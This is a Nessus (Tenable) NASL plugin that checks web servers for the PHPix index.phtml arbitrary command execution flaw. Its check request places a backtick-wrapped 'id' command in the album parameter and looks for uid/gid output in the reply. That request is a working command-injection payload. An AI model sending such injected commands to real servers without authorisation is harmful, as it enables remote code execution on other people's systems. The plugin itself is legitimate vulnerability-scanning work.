#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
  script_id(12026);
  script_version("$Revision: 1.18 $");

  script_bugtraq_id(9458);
  script_osvdb_id(3745);

  script_name(english:"PHPix index.phtml Multiple Parameter Arbitrary Command Execution");

 script_set_attribute(attribute:"synopsis", value:
"Arbitrary code may be run on the remote server." );
 script_set_attribute(attribute:"description", value:
"The remote host is running phpix, a PHP-based photo gallery suite.

Multiple vulnerabilities have been discovered in this product, which may
allow a remote attacker to execute arbitrary commands with the 
privileges of the HTTP server." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to the latest version of this CGI suite." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2004/01/20");
 script_set_attribute(attribute:"vuln_publication_date", value: "2004/01/29");
 script_cvs_date("$Date: 2012/09/07 21:49:39 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe",value:"cpe:/a:phpix:phpix");
 script_end_attributes();

  script_summary(english:"Detect phpix cmd execution");
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2004-2012 Tenable Network Security, Inc.");
  script_family(english:"CGI abuses");

  script_dependencie("find_service1.nasl", "http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

if (! can_host_php(port:port) ) exit(0);


http_check_remote_code (
			extra_dirs:make_list("/phpix"),
			check_request:"/index.phtml?mode=view&album=`id`&pic=A=10.jpg&dispsize=640&start=0",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id"
			);
